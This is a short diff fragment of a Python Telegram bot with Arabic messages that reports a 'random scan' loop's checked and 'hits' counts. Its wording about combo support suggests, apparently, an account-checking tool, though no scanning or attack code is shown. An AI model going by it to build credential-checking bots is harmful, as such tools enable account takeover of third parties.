+            if chat_id in user_scanners: user_scanners[chat_id]["last_error"] = str(e)
             time.sleep(1)
 
     cli.close()
     try:
-        final_state = user_scanners.get(chat_id, {"checked": 0, "hits": 0})
-        bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=message_id,
-            text=f"⏹ **توقف الفحص العشوائي نهائياً.**\nنتائجك النهائية:\n• إجمالي الفحص: `{final_state.get('checked', 0)}`\n• الصيد: `{final_state.get('hits', 0)}`",
-            reply_markup=get_main_keyboard(chat_id, False),
-            parse_mode="Markdown"
-        )
-    except:
-        pass
+        st = user_scanners.get(chat_id, {"checked": 0, "hits": 0})
+        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"⏹ **توقف الفحص العشوائي.**\n• إجمالي: `{st.get('checked',0)}`\n• Hits: `{st.get('hits',0)}`", reply_markup=get_main_keyboard(chat_id, False), parse_mode="Markdown")
+    except: pass
 
 if __name__ == "__main__":
-    print("Bot is running with updated gRPC connections and Combo support...")
+    print("Bot is running with enhanced gRPC stability and maximum accuracy...")
     bot.infinity_polling()
